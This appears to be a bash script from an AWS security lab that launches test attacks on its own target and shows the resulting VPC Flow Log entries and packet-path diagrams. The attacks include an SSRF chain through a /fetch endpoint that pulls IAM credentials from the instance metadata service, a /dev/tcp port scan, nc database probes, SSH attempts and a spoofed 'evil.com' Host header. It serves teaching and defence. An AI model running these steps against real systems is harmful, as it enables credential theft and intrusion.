#!/usr/bin/env bash
# =============================================================================
# trace_attack_flow.sh — Simultaneous attack execution and network flow capture/visualization
# =============================================================================
# Purpose:
#   Execute a specific attack, capture actual packet flows via VPC Flow Logs,
#   and display pre/post attack differences. Show attack results alongside
#   network flows to visually understand security defense operations.
#
# Prerequisites:
#   - AWS CLI configured
#   - VPC Flow Logs enabled (1-minute aggregation)
#   - terraform apply completed
#
# Usage:
#   ./trace_attack_flow.sh ssh         # SSH connection attempt trace
#   ./trace_attack_flow.sh http        # HTTP attack trace
#   ./trace_attack_flow.sh ssrf        # SSRF attack trace
#   ./trace_attack_flow.sh portscan    # Port scan trace
#   ./trace_attack_flow.sh postgresql   # PostgreSQL direct connection attempt trace
# =============================================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/_common.sh"

# =============================================================================
# Constants
# =============================================================================
# Flow Logs aggregation delay (seconds). Accounts for 1-minute aggregation + CloudWatch write latency
FLOW_LOG_DELAY=90
# Query time window (seconds). Covers pre and post attack
QUERY_WINDOW=300

AWS_REGION=""
PROJECT_NAME=""
LOG_GROUP=""
NAT_GW_EIP=""
MY_PUBLIC_IP=""

# =============================================================================
# Argument check
# =============================================================================
ATTACK_TYPE="${1:-}"

if [[ -z "${ATTACK_TYPE}" ]]; then
    echo -e "${RED}[!] Please specify attack type${NC}"
    echo ""
    echo "Usage:"
    echo "  $0 <attack_type>"
    echo ""
    echo "Attack type:"
    echo "  ssh       — SSH connection attempt (Port 22)"
    echo "  http      — HTTP GET request (Port 80)"
    echo "  ssrf      — Access IMDS via SSRF"
    echo "  portscan  — Scan major ports"
    echo "  postgresql — PostgreSQL direct connection attempt (Port 5432)"
    exit 1
fi

# =============================================================================
# Initialization
# =============================================================================
init_config

PROJECT_NAME=$(tf_output "project_name" 2>/dev/null || echo "sec-lab")
if [[ -z "${PROJECT_NAME}" ]]; then
    PROJECT_NAME="sec-lab"
fi
LOG_GROUP="/vpc/${PROJECT_NAME}/flow-logs"
NAT_GW_EIP=$(tf_output "nat_gw_eip" 2>/dev/null || echo "")
AWS_REGION=$(tf_output "aws_region" 2>/dev/null || echo "ap-northeast-1")
if [[ -z "${AWS_REGION}" ]]; then
    AWS_REGION="ap-northeast-1"
fi

# Retrieve the attacker's public IP
MY_PUBLIC_IP=$(curl -s --max-time 5 https://checkip.amazonaws.com 2>/dev/null | tr -d '\n' || echo "unknown")

OUTPUT_DIR="${RESULTS_DIR}/trace-${ATTACK_TYPE}"
mkdir -p "${OUTPUT_DIR}"

echo -e "${BLUE}[*] CloudWatch Logs: ${LOG_GROUP}${NC}"
echo -e "${BLUE}[*] Attacker IP: ${MY_PUBLIC_IP}${NC}"
echo -e "${BLUE}[*] Attack type: ${ATTACK_TYPE}${NC}"
echo ""

# =============================================================================
# Countdown display
# =============================================================================
countdown() {
    local seconds=$1
    local msg="${2:-Waiting for Flow Logs aggregation}"

    echo ""
    while [[ ${seconds} -gt 0 ]]; do
        local min=$((seconds / 60))
        local sec=$((seconds % 60))
        printf "\r  ${YELLOW}⏳ %s... remaining %d:%02d${NC}  " "${msg}" "${min}" "${sec}"
        sleep 1
        ((seconds--))
    done
    printf "\r%70s\r" ""
    echo -e "  ${GREEN}✓ Wait complete${NC}"
    echo ""
}

# =============================================================================
# CloudWatch Logs Insights query execution
# =============================================================================
run_query() {
    local query="$1"
    local start_time="$2"
    local end_time="$3"
    local description="${4:-Query}"

    local query_id status

    query_id=$(aws logs start-query \
        --log-group-name "${LOG_GROUP}" \
        --start-time "${start_time}" \
        --end-time "${end_time}" \
        --query-string "${query}" \
        --region "${AWS_REGION}" \
        --output text \
        --query 'queryId' 2>/dev/null) || {
        echo -e "${RED}[!] Query start failed: ${description}${NC}" >&2
        return 1
    }

    local wait_count=0
    while [[ ${wait_count} -lt 60 ]]; do
        status=$(aws logs get-query-results \
            --query-id "${query_id}" \
            --region "${AWS_REGION}" \
            --query 'status' \
            --output text 2>/dev/null)

        if [[ "${status}" == "Complete" ]]; then
            break
        elif [[ "${status}" == "Failed" || "${status}" == "Cancelled" ]]; then
            echo -e "${RED}[!] Query failed: ${description}${NC}" >&2
            return 1
        fi

        sleep 1
        ((wait_count++))
    done

    aws logs get-query-results \
        --query-id "${query_id}" \
        --region "${AWS_REGION}" \
        --output json 2>/dev/null
}

# =============================================================================
# Attack execution functions
# =============================================================================

# --- SSH connection attempt ---
attack_ssh() {
    echo -e "${RED}[ATTACK] SSH connection attempt (${ATTACK_TARGET}:22)${NC}"
    echo ""

    local result
    # Attempt SSH connection with 5-second timeout (failure expected)
    result=$(ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=5 \
        -o BatchMode=yes \
        -o UserKnownHostsFile=/dev/null \
        "test@${ATTACK_TARGET}" "echo connected" 2>&1 || true)

    echo "  Result: ${result}"
    echo "${result}" > "${OUTPUT_DIR}/attack_output.txt"
}

# --- HTTP attack ---
attack_http() {
    echo -e "${RED}[ATTACK] HTTP GET request (${ATTACK_TARGET}:80)${NC}"
    echo ""

    local url="http://${ATTACK_TARGET}"

    # Normal GET request
    echo "  1. GET /"
    local r1
    r1=$(curl -s -o /dev/null -w "HTTP %{http_code} (%{time_total}s)" \
        --max-time 10 "${url}/" 2>&1 || echo "Connection failed")
    echo "     → ${r1}"

    # Access to invalid path
    echo "  2. GET /admin"
    local r2
    r2=$(curl -s -o /dev/null -w "HTTP %{http_code} (%{time_total}s)" \
        --max-time 10 "${url}/admin" 2>&1 || echo "Connection failed")
    echo "     → ${r2}"

    # Host header manipulation
    echo "  3. GET / (Host: evil.com)"
    local r3
    r3=$(curl -s -o /dev/null -w "HTTP %{http_code} (%{time_total}s)" \
        --max-time 10 -H "Host: evil.com" "${url}/" 2>&1 || echo "Connection failed")
    echo "     → ${r3}"

    {
        echo "1. GET /: ${r1}"
        echo "2. GET /admin: ${r2}"
        echo "3. GET / (Host: evil.com): ${r3}"
    } > "${OUTPUT_DIR}/attack_output.txt"
}

# --- SSRF attack ---
attack_ssrf() {
    echo -e "${RED}[ATTACK] SSRF — IMDS metadata theft (${ATTACK_TARGET}:80)${NC}"
    echo ""

    local url="http://${ATTACK_TARGET}"
    local imds_base="http://169.254.169.254"

    # Step 1: Check /fetch endpoint
    echo "  1. Checking /fetch endpoint"
    local r1
    r1=$(curl -s --max-time 10 "${url}/fetch?url=${imds_base}/latest/meta-data/" 2>&1 || echo "Connection failed")
    echo "     → $(echo "${r1}" | head -3)"

    # Step 2: Retrieve IAM role name
    echo "  2. Retrieve IAM role name"
    local r2
    r2=$(curl -s --max-time 10 \
        "${url}/fetch?url=${imds_base}/latest/meta-data/iam/security-credentials/" 2>&1 || echo "Retrieval failed")
    echo "     → ${r2}"

    # Step 3: Retrieve credentials
    if [[ -n "${r2}" && "${r2}" != "Retrieval failed" && "${r2}" != *"404"* ]]; then
        local role_name
        role_name=$(echo "${r2}" | head -1 | tr -d '[:space:]')
        echo "  3. Retrieving IAM credentials (role: ${role_name})"
        local r3
        r3=$(curl -s --max-time 10 \
            "${url}/fetch?url=${imds_base}/latest/meta-data/iam/security-credentials/${role_name}" 2>&1 || echo "Retrieval failed")
        echo "     → $(echo "${r3}" | head -5)"
    fi

    {
        echo "=== SSRF Attack Results ==="
        echo "Step 1 (meta-data): ${r1}"
        echo "Step 2 (iam role): ${r2}"
    } > "${OUTPUT_DIR}/attack_output.txt"
}

# --- Port scan ---
attack_portscan() {
    echo -e "${RED}[ATTACK] Port scan (${ATTACK_TARGET})${NC}"
    echo ""

    local ports=(21 22 23 25 53 80 110 143 443 445 993 995 1433 3389 5432 6379 8080 8443 27017)
    local result_text=""

    printf "  ${BOLD}%-8s %-10s${NC}\n" "Port" "Status"
    echo "  ──────────────────"

    for port in "${ports[@]}"; do
        local state
        # Connection test with 2-second timeout
        if run_with_timeout 2 bash -c "echo >/dev/tcp/${ATTACK_TARGET}/${port}" 2>/dev/null; then
            state="${GREEN}OPEN${NC}"
            result_text="${result_text}${port}/tcp  OPEN\n"
        else
            state="${RED}CLOSED/FILTERED${NC}"
            result_text="${result_text}${port}/tcp  CLOSED/FILTERED\n"
        fi
        printf "  %-8s %b\n" "${port}" "${state}"
    done

    echo -e "${result_text}" > "${OUTPUT_DIR}/attack_output.txt"
}

# --- PostgreSQL direct connection ---
attack_postgresql() {
    echo -e "${RED}[ATTACK] PostgreSQL direct connection attempt (${ATTACK_TARGET}:5432)${NC}"
    echo ""

    # Attempt direct connection to RDS endpoint
    local rds_host
    rds_host=$(parse_rds_host)

    echo "  1. PostgreSQL connection attempt via attack target"
    local r1
    r1=$(run_with_timeout 5 bash -c "echo | nc -w 3 ${ATTACK_TARGET} 5432" 2>&1 || echo "Connection refused/timeout")
    echo "     → ${r1:0:100}"

    # Direct access to RDS from outside (should always fail)
    if [[ -n "${rds_host}" ]]; then
        echo "  2. RDS endpoint direct connection attempt (${rds_host}:5432)"
        local r2
        r2=$(run_with_timeout 5 bash -c "echo | nc -w 3 ${rds_host} 5432" 2>&1 || echo "Connection refused/timeout")
        echo "     → ${r2:0:100}"
    fi

    {
        echo "=== PostgreSQL Direct Access Test ==="
        echo "Target:5432: ${r1:0:200}"
        echo "RDS Direct: ${r2:-N/A}"
    } > "${OUTPUT_DIR}/attack_output.txt"
}

# =============================================================================
# Get pre-attack Flow Log baseline
# =============================================================================
get_baseline() {
    echo -e "${BLUE}[*] Retrieving baseline (pre-attack flow logs)${NC}"

    local now
    now=$(date +%s)
    local start=$((now - QUERY_WINDOW))

    # Count flows related to attacker IP
    local query
    if [[ "${MY_PUBLIC_IP}" != "unknown" ]]; then
        query="filter srcAddr = '${MY_PUBLIC_IP}' or dstAddr = '${MY_PUBLIC_IP}'
| stats count(*) as total"
    else
        query="stats count(*) as total"
    fi

    local result
    result=$(run_query "${query}" "${start}" "${now}" "Baseline") || {
        echo -e "${YELLOW}[!] Baseline retrieval failed. Continuing.${NC}"
        echo "0"
        return 0
    }

    local baseline_count
    baseline_count=$(echo "${result}" | python3 -c "
import json, sys
data = json.load(sys.stdin)
results = data.get('results', [])
if results:
    fields = {f['field']: f['value'] for f in results[0]}
    print(fields.get('total', '0'))
else:
    print('0')
" 2>/dev/null || echo "0")

    echo -e "  Baseline flow count: ${baseline_count}"
    echo "${baseline_count}"
}

# =============================================================================
# Retrieve and analyze post-attack flow logs
# =============================================================================
analyze_attack_flows() {
    local attack_start="$1"
    local attack_end="$2"

    echo -e "${BLUE}[*] Retrieving attack-related flows...${NC}"

    # Widen time window to absorb Flow Logs delay
    local query_start=$((attack_start - 60))
    local query_end=$((attack_end + FLOW_LOG_DELAY + 60))

    # Retrieve detailed flows related to attacker IP
    local query
    if [[ "${MY_PUBLIC_IP}" != "unknown" ]]; then
        query="filter srcAddr = '${MY_PUBLIC_IP}' or dstAddr = '${MY_PUBLIC_IP}'
| fields @timestamp, srcAddr, dstAddr, srcPort, dstPort, protocol, action, packets, bytes
| sort @timestamp asc
| limit 100"
    else
        query="fields @timestamp, srcAddr, dstAddr, srcPort, dstPort, protocol, action, packets, bytes
| sort @timestamp asc
| limit 100"
    fi

    local result
    result=$(run_query "${query}" "${query_start}" "${query_end}" "Attack flow details") || {
        echo -e "${RED}[!] Flow log retrieval failed${NC}"
        return 1
    }

    echo "${result}" > "${OUTPUT_DIR}/attack_flows.json"

    # --- Flow list table ---
    echo ""
    echo -e "${BOLD}  ┌─ Network flows generated by the attack ─────────────────────────┐${NC}"
    echo ""
    printf "  ${BOLD}%-20s %-18s %-18s %-6s %-6s %-8s %6s${NC}\n" \
        "Time" "Source" "Destination" "SPort" "DPort" "Verdict" "Pkts"
    echo "  ────────────────────────────────────────────────────────────────────────────"

    local flow_count
    flow_count=$(echo "${result}" | python3 -c "
import json, sys

PROTO = {'6': 'TCP', '17': 'UDP', '1': 'ICMP'}

data = json.load(sys.stdin)
results = data.get('results', [])
count = 0

for row in results:
    fields = {f['field']: f['value'] for f in row}
    ts = fields.get('@timestamp', '?')
    # Shorten timestamp (to HH:MM:SS)
    if len(ts) > 19:
        ts = ts[11:19]
    elif len(ts) > 8:
        ts = ts[-8:]

    src = fields.get('srcAddr', '?')
    dst = fields.get('dstAddr', '?')
    sp = fields.get('srcPort', '?')
    dp = fields.get('dstPort', '?')
    action = fields.get('action', '?')
    pkts = fields.get('packets', '0')

    if action == 'ACCEPT':
        color = '\033[0;32m'
        mark = '✓'
    else:
        color = '\033[0;31m'
        mark = '✗'
    end = '\033[0m'

    print(f'  {ts:<20} {src:<18} {dst:<18} {sp:<6} {dp:<6} {color}{mark} {action:<6}{end} {pkts:>6}')
    count += 1

print(f'---COUNT:{count}')
" 2>/dev/null || echo "---COUNT:0")

    # Extract COUNT
    local count_line
    count_line=$(echo "${flow_count}" | grep "^---COUNT:" | tail -1)
    flow_count="${count_line#---COUNT:}"
    # Display table (exclude COUNT marker line)
    echo "${flow_count}" | grep -v "^---COUNT:" || true

    echo ""
    echo -e "  ${BOLD}Total flow count: ${flow_count:-0}${NC}"
    echo ""

    # --- Port/Action Summary ---
    local summary_query
    if [[ "${MY_PUBLIC_IP}" != "unknown" ]]; then
        summary_query="filter srcAddr = '${MY_PUBLIC_IP}' or dstAddr = '${MY_PUBLIC_IP}'
| stats count(*) as total, sum(packets) as pkts by dstPort, action
| sort total desc"
    else
        summary_query="stats count(*) as total, sum(packets) as pkts by dstPort, action
| sort total desc
| limit 20"
    fi

    local summary
    summary=$(run_query "${summary_query}" "${query_start}" "${query_end}" "Port Summary") || return 1

    echo -e "${BOLD}  ┌─ Port Summary ──────────────────────┐${NC}"
    echo ""
    printf "  ${BOLD}%-8s %-10s %8s %10s${NC}\n" "DstPort" "Action" "Count" "Packets"
    echo "  ─────────────────────────────────────────"

    echo "${summary}" | python3 -c "
import json, sys

PORT_NAMES = {
    '22': 'SSH', '80': 'HTTP', '443': 'HTTPS',
    '5432': 'PostgreSQL', '8080': 'HTTP-Alt', '53': 'DNS',
}

data = json.load(sys.stdin)
for row in data.get('results', []):
    fields = {f['field']: f['value'] for f in row}
    dp = fields.get('dstPort', '?')
    action = fields.get('action', '?')
    total = fields.get('total', '0')
    pkts = fields.get('pkts', '0')

    svc = PORT_NAMES.get(dp, '')
    label = f'{dp} ({svc})' if svc else dp

    color = '\033[0;32m' if action == 'ACCEPT' else '\033[0;31m'
    end = '\033[0m'
    print(f'  {label:<14} {color}{action:<10}{end} {total:>8} {pkts:>10}')
" 2>/dev/null

    echo "${summary}" > "${OUTPUT_DIR}/port_summary.json"
}

# =============================================================================
# Draw ASCII packet path diagram
# =============================================================================
draw_packet_path() {
    local attack_type="$1"

    echo ""
    print_header "Packet Path Diagram"

    if [[ "${CONFIG_MODE}" == "public" ]]; then
        draw_public_path "${attack_type}"
    else
        draw_private_path "${attack_type}"
    fi
}

# --- Config A: Public configuration packet path ---
draw_public_path() {
    local attack_type="$1"
    local app_ip="${APP_PUBLIC_IP:-${ATTACK_TARGET}}"
    local priv_ip="${APP_PRIVATE_IP:-10.0.1.x}"

    cat <<EOF

  ${BOLD}Config A: Public Direct — ${attack_type} attack packet path${NC}

EOF

    case "${attack_type}" in
        ssh)
            cat <<EOF
  Attacker (${MY_PUBLIC_IP})
      │
      │ TCP SYN :22
      ▼
  ┌──────────────────┐
  │ Internet Gateway │
  └────────┬─────────┘
           │ DNAT: ${app_ip} → ${priv_ip}
           ▼
  ┌──────────────────────────────────────┐
  │ Security Group (App)                  │
  │ Port 22: $(sg_rule_display "ssh" "public")
  └────────┬─────────────────────────────┘
           │
           ▼
  ┌──────────────────┐
  │ EC2 App Server   │
  │ ${priv_ip}:22    │
  └──────────────────┘
      │
      │ SSH response (success or rejected)
      ▼
  EC2 → IGW → Attacker
EOF
            ;;
        http)
            cat <<EOF
  Attacker (${MY_PUBLIC_IP})
      │
      │ TCP SYN :80
      ▼
  ┌──────────────────┐
  │ Internet Gateway │
  └────────┬─────────┘
           │ DNAT: ${app_ip} → ${priv_ip}
           ▼
  ┌──────────────────────────────────────┐
  │ Security Group (App)                  │
  │ Port 80: ${GREEN}ACCEPT (0.0.0.0/0)${NC}         │
  └────────┬─────────────────────────────┘
           │
           ▼
  ┌──────────────────┐
  │ EC2 App Server   │
  │ ${priv_ip}:80    │  ← ${RED}Packet arrived!${NC}
  └──────────────────┘
      │
      │ HTTP Response (200/404/etc)
      ▼
  EC2 → IGW → Attacker
EOF
            ;;
        ssrf)
            cat <<EOF
  Attacker (${MY_PUBLIC_IP})
      │
      │ HTTP GET /fetch?url=http://169.254.169.254/...
      ▼
  ┌──────────────────┐
  │ Internet Gateway │
  └────────┬─────────┘
           │
           ▼
  ┌──────────────────────────────────────┐
  │ Security Group (App)                  │
  │ Port 80: ${GREEN}ACCEPT${NC}                      │
  └────────┬─────────────────────────────┘
           │
           ▼
  ┌──────────────────┐
  │ EC2 App Server   │  ← HTTP request received
  │ ${priv_ip}:80    │
  └────────┬─────────┘
           │
           │ ${RED}SSRF: GET http://169.254.169.254/...${NC}
           ▼
  ┌──────────────────────────────────────┐
  │ ${RED}IMDS (169.254.169.254)${NC}                │
  │ Link-local — SG/NACL bypass     │
  │ ${RED}← IMDSv1: Responds without token!${NC}       │
  └────────┬─────────────────────────────┘
           │
           │ Return IAM credentials
           ▼
  EC2 → HTTP Response → IGW → ${RED}Attacker obtains credentials${NC}
EOF
            ;;
        portscan)
            cat <<EOF
  Attacker (${MY_PUBLIC_IP})
      │
      │ TCP SYN → Multiple ports (21,22,23,25,80,443,5432,...)
      ▼
  ┌──────────────────┐
  │ Internet Gateway │
  └────────┬─────────┘
           │
           ▼
  ┌──────────────────────────────────────────┐
  │ Security Group (App)                      │
  │                                            │
  │ Port 22:   ${GREEN}ACCEPT${NC} (my_ip only)               │
  │ Port 80:   ${GREEN}ACCEPT${NC} (0.0.0.0/0)             │
  │ Others:    ${RED}REJECT${NC} (Implicit Deny)              │
  │                                            │
  │ → ${YELLOW}Only permitted ports reach EC2${NC}                │
  │ → ${RED}Non-permitted ports dropped by SG${NC}              │
  └────────┬─────────────────────────────────┘
           │ (Port 80, 22  only pass)
           ▼
  ┌──────────────────┐
  │ EC2 App Server   │
  │ ${priv_ip}       │
  └──────────────────┘
EOF
            ;;
        postgresql)
            cat <<EOF
  Attacker (${MY_PUBLIC_IP})
      │
      │ TCP SYN :5432
      ▼
  ┌──────────────────┐
  │ Internet Gateway │
  └────────┬─────────┘
           │
           ▼
  ┌──────────────────────────────────────┐
  │ Security Group (App)                  │
  │ Port 5432: ${RED}REJECT (no allow rule)${NC}      │
  └──────────────────────────────────────┘
      │
      ✗ ${RED}Packets do not reach EC2${NC}

  * If RDS access is attempted from within EC2:

  EC2 (${priv_ip})
      │
      │ TCP :5432
      ▼
  ┌──────────────────────────────────────┐
  │ Security Group (DB)                   │
  │ Port 5432: ${GREEN}ACCEPT (from App SG)${NC}      │
  └────────┬─────────────────────────────┘
           │
           ▼
  ┌──────────────────┐
  │ RDS              │
  │ 10.0.20.x:5432  │  ← ${GREEN}Internal traffic only allowed${NC}
  └──────────────────┘
EOF
            ;;
    esac
    echo ""
}

# --- Config B: Private configuration packet path ---
draw_private_path() {
    local attack_type="$1"
    local priv_ip="${APP_PRIVATE_IP:-10.0.10.x}"
    local alb="${ALB_DNS_NAME:-ALB}"

    cat <<EOF

  ${BOLD}Config B: Private + ALB — ${attack_type} attack packet path${NC}

EOF

    case "${attack_type}" in
        ssh)
            cat <<EOF
  Attacker (${MY_PUBLIC_IP})
      │
      │ TCP SYN :22
      ▼
  ┌──────────────────┐
  │ Internet Gateway │
  └────────┬─────────┘
           │
           ▼
  ┌──────────────────────────────────────┐
  │ ALB (${alb})                          │
  │ Listener: Port 80 only                │
  │ ${RED}Port 22 → No listener → Connection refused${NC}  │
  └──────────────────────────────────────┘
      │
      ✗ ${RED}ALB does not accept SSH (L7 proxy)${NC}

  * EC2 is in Private Subnet with no Public IP
  * Attacker cannot even know EC2's Private IP
EOF
            ;;
        http)
            cat <<EOF
  Attacker (${MY_PUBLIC_IP})
      │
      │ TCP SYN :80
      ▼
  ┌──────────────────┐
  │ Internet Gateway │
  └────────┬─────────┘
           │ DNAT → ALB ENI
           ▼
  ┌──────────────────────────────────────┐
  │ ALB Security Group                    │
  │ Port 80: ${GREEN}ACCEPT (0.0.0.0/0)${NC}         │
  └────────┬─────────────────────────────┘
           │
           ▼
  ┌──────────────────────────────────────┐
  │ ALB (${alb})                          │
  │ L7 proxy: Creates new TCP connection        │
  │ src: ALB Private IP                   │
  │ dst: ${priv_ip}:80                    │
  └────────┬─────────────────────────────┘
           │ ${YELLOW}← Source IP changes to ALB here${NC}
           ▼
  ┌──────────────────────────────────────┐
  │ App Security Group                    │
  │ Port 80: ${GREEN}ACCEPT (from ALB SG)${NC}        │
  └────────┬─────────────────────────────┘
           │
           ▼
  ┌──────────────────┐
  │ EC2 App Server   │  ← Packet arrived
  │ ${priv_ip}:80    │  ← ${YELLOW}Source is ALB IP${NC}
  └──────────────────┘
      │
      │ HTTP Response
      ▼
  EC2 → ALB → IGW → Attacker
EOF
            ;;
        ssrf)
            cat <<EOF
  Attacker (${MY_PUBLIC_IP})
      │
      │ HTTP GET /fetch?url=http://169.254.169.254/...
      ▼
  ┌──────────────────┐
  │ Internet Gateway │
  └────────┬─────────┘
           │
           ▼
  ┌──────────────────────────────────────┐
  │ ALB Security Group: Port 80 ${GREEN}ACCEPT${NC}   │
  └────────┬─────────────────────────────┘
           │
           ▼
  ┌──────────────────────────────────────┐
  │ ALB — L7 Proxy                        │
  │ ${YELLOW}X-Forwarded-For: ${MY_PUBLIC_IP}${NC}     │
  └────────┬─────────────────────────────┘
           │ New TCP connection (ALB → EC2)
           ▼
  ┌──────────────────────────────────────┐
  │ App Security Group: Port 80 ${GREEN}ACCEPT${NC}    │
  └────────┬─────────────────────────────┘
           │
           ▼
  ┌──────────────────┐
  │ EC2 App Server   │  ← /fetch request received
  │ ${priv_ip}:80    │
  └────────┬─────────┘
           │
           │ ${RED}SSRF: GET http://169.254.169.254/...${NC}
           ▼
  ┌──────────────────────────────────────┐
  │ ${RED}IMDS (169.254.169.254)${NC}                │
  │ Link-local — SG/NACL bypass     │
  │ ${RED}← SSRF succeeds even through ALB${NC}        │
  └────────┬─────────────────────────────┘
           │
           │ Return IAM credentials
           ▼
  EC2 → ALB → IGW → Attacker

  ${YELLOW}Note: ALB cannot prevent SSRF itself.${NC}
  ${YELLOW}Defense requires enforcing IMDSv2 or WAF.${NC}
EOF
            ;;
        portscan)
            cat <<EOF
  Attacker (${MY_PUBLIC_IP})
      │
      │ TCP SYN → Multiple ports
      ▼
  ┌──────────────────┐
  │ Internet Gateway │
  └────────┬─────────┘
           │
           ▼
  ┌──────────────────────────────────────────────┐
  │ ALB (${alb})                                  │
  │                                                │
  │ Port 80:   ${GREEN}ACCEPT${NC} → Forward to target group   │
  │ Port 443:  ${RED}No listener${NC}                         │
  │ Others:    ${RED}No listener → Connection refused${NC}       │
  │                                                │
  │ ${YELLOW}ALB acts as a 'shield' completely hiding EC2${NC}             │
  │ → Attacker can only see ALB's DNS name            │
  │ → EC2's Private IP is unreachable from outside            │
  └──────────────────────────────────────────────┘
      │
      ✗ ${RED}Only Port 80 HTTP reaches EC2${NC}

  ${GREEN}Defense effect:${NC}
    Config A: Attacker can directly probe EC2's Public IP and open ports
    Config B: ALB limits attack surface to Port 80
EOF
            ;;
        postgresql)
            cat <<EOF
  Attacker (${MY_PUBLIC_IP})
      │
      │ TCP SYN :5432
      ▼
  ┌──────────────────┐
  │ Internet Gateway │
  └────────┬─────────┘
           │
           ▼
  ┌──────────────────────────────────────┐
  │ ALB (${alb})                          │
  │ ${RED}Port 5432 → No listener${NC}               │
  │ ${RED}→ Connection refused${NC}                   │
  └──────────────────────────────────────┘
      │
      ✗ ${RED}ALB does not accept PostgreSQL connections${NC}

  ${GREEN}Defense in depth:${NC}
    Layer 1: ALB does not accept Port 5432
    Layer 2: App SG allows only Port 80 from ALB SG
    Layer 3: DB SG allows only Port 5432 from App SG
    Layer 4: RDS is isolated in Private Subnet

  * Attacker must breach all 4 layers to reach RDS
EOF
            ;;
    esac
    echo ""
}

# =============================================================================
# SG rule display helper
# =============================================================================
sg_rule_display() {
    local port_type="$1"
    local config="$2"

    case "${port_type}" in
        ssh)
            if [[ "${config}" == "public" ]]; then
                echo -e "${GREEN}ACCEPT (my_ip only)${NC}            │"
            else
                echo -e "${RED}REJECT (from ALB SG only)${NC}      │"
            fi
            ;;
        http)
            echo -e "${GREEN}ACCEPT (0.0.0.0/0)${NC}            │"
            ;;
    esac
}

# =============================================================================
# Main execution
# =============================================================================
main() {
    echo -e "${BOLD}${CYAN}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BOLD}${CYAN}║  Attack trace: ${ATTACK_TYPE}                           ║${NC}"
    echo -e "${BOLD}${CYAN}║  Config: ${CONFIG_LABEL}${NC}"
    echo -e "${BOLD}${CYAN}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""

    # Step 1: Retrieve baseline
    print_header "STEP 1: Retrieve Baseline"
    local baseline
    baseline=$(get_baseline)

    # Step 2: Execute attack
    print_header "STEP 2: Execute Attack (${ATTACK_TYPE})"
    local attack_start
    attack_start=$(date +%s)

    case "${ATTACK_TYPE}" in
        ssh)      attack_ssh ;;
        http)     attack_http ;;
        ssrf)     attack_ssrf ;;
        portscan) attack_portscan ;;
        postgresql) attack_postgresql ;;
        *)
            echo -e "${RED}[!] Unknown attack type: ${ATTACK_TYPE}${NC}"
            exit 1
            ;;
    esac

    local attack_end
    attack_end=$(date +%s)

    # STEP 3: Wait for Flow Logs aggregation
    print_header "STEP 3: Waiting for Flow Logs Aggregation"
    echo -e "${YELLOW}  VPC Flow Logs aggregation interval is 1 minute.${NC}"
    echo -e "${YELLOW}  Including CloudWatch Logs write delay, waiting ${FLOW_LOG_DELAY} seconds.${NC}"

    countdown "${FLOW_LOG_DELAY}" "Waiting for Flow Logs to arrive in CloudWatch"

    # Step 4: Retrieve and analyze post-attack flows
    print_header "STEP 4: Flow log analysis"
    analyze_attack_flows "${attack_start}" "${attack_end}"

    # STEP 5: Packet path diagram
    draw_packet_path "${ATTACK_TYPE}"

    # STEP 6: Result summary
    echo ""
    echo -e "${BOLD}${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${GREEN}[✓] Trace complete. Results saved to ${OUTPUT_DIR}${NC}"
    echo -e "${BOLD}${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
    echo "  Saved files:"
    ls -1 "${OUTPUT_DIR}"/ 2>/dev/null | while read -r f; do
        echo "    - ${OUTPUT_DIR}/${f}"
    done
}

main
